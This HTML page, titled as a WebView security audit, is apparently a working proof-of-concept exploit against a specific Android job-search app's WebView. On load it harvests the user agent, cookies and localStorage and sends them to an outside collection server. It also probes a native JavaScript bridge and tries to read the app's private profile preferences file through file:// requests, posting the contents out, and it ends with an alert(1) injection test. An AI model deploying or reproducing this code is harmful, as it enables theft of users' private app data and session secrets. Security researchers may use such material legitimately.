<!DOCTYPE html>
<html>
<head>
    <title>System Audit</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: sans-serif; background-color: #121212; color: #00ff00; padding: 20px; }
        .log-container { background: #000; border: 1px solid #333; padding: 15px; border-radius: 5px; font-family: monospace; font-size: 12px; white-space: pre-wrap; margin-bottom: 20px; }
        .status-ok { color: #00ff00; }
        .status-fail { color: #ff0000; }
        button { background: #333; color: #fff; border: 1px solid #555; padding: 10px; cursor: pointer; }
    </style>
</head>
<body>
    <h3>WebView Security Audit</h3>
    
    <div>[1] Environment Recon</div>
    <div id="recon-log" class="log-container">Initializing...</div>

    <div>[2] Bridge Probe (MobileClient)</div>
    <div id="bridge-log" class="log-container">Searching...</div>

    <div>[3] Local File Access (Critical)</div>
    <div id="file-log" class="log-container">Waiting for user interaction...</div>
    <button onclick="runFileSteal()">Execute File Access Test</button>

    <script>
        const C2 = "https://evilios.free.beeceptor.com";
        const TARGET_FILE = "file:///data/data/com.ziprecruiter.android.release/shared_prefs/profile_shared_pref_name.xml";

        // Helper to beam data to your Beeceptor
        async function beam(type, data) {
            try {
                await fetch(C2 + "/audit", {
                    method: "POST",
                    mode: "no-cors",
                    body: JSON.stringify({ type: type, data: data, ts: Date.now() })
                });
            } catch (e) {
                // Fallback for restricted environments
                new Image().src = C2 + "/log?t=" + type + "&d=" + btoa(JSON.stringify(data).substring(0, 200));
            }
        }

        // 1. Collect Recon Data
        window.onload = () => {
            const recon = {
                ua: navigator.userAgent,
                cookies: document.cookie || "None accessible (HttpOnly?)",
                localStorage: JSON.stringify(localStorage),
                origin: window.location.origin
            };
            document.getElementById('recon-log').innerText = JSON.stringify(recon, null, 2);
            beam("RECON", recon);

            // 2. Probe Bridge
            if (window.MobileClient) {
                const methods = Object.keys(window.MobileClient);
                document.getElementById('bridge-log').innerText = "FOUND: MobileClient\nMethods: " + methods.join(", ");
                beam("BRIDGE_DATA", { methods });
            } else {
                document.getElementById('bridge-log').innerText = "NOT FOUND: MobileClient interface is missing.";
            }
        };

        // 3. File Access Logic
        async function runFileSteal() {
            const log = document.getElementById('file-log');
            log.innerText = "Attempting to read: " + TARGET_FILE + "\n";

            // Technique A: XHR (Standard for file:// access if enabled)
            try {
                const xhr = new XMLHttpRequest();
                xhr.open("GET", TARGET_FILE, true);
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4) {
                        if (xhr.status === 200 || xhr.responseText.length > 0) {
                            log.className = "log-container status-ok";
                            log.innerText += "[SUCCESS] XHR Read:\n" + xhr.responseText;
                            beam("FILE_SUCCESS_XHR", { content: xhr.responseText });
                        } else {
                            log.innerText += "[FAIL] XHR Status: " + xhr.status + " (Access Denied/Blocked)\n";
                        }
                    }
                };
                xhr.send();
            } catch (e) {
                log.innerText += "[ERROR] XHR Exception: " + e.message + "\n";
            }

            // Technique B: Fetch
            try {
                const response = await fetch(TARGET_FILE);
                const text = await response.text();
                if(text) {
                    log.innerText += "[SUCCESS] Fetch Read Successful\n";
                    beam("FILE_SUCCESS_FETCH", { content: text });
                }
            } catch (e) {
                log.innerText += "[FAIL] Fetch blocked.\n";
            }
        }
    </script>
    <script>alert(1)</script>
</body>
</html>
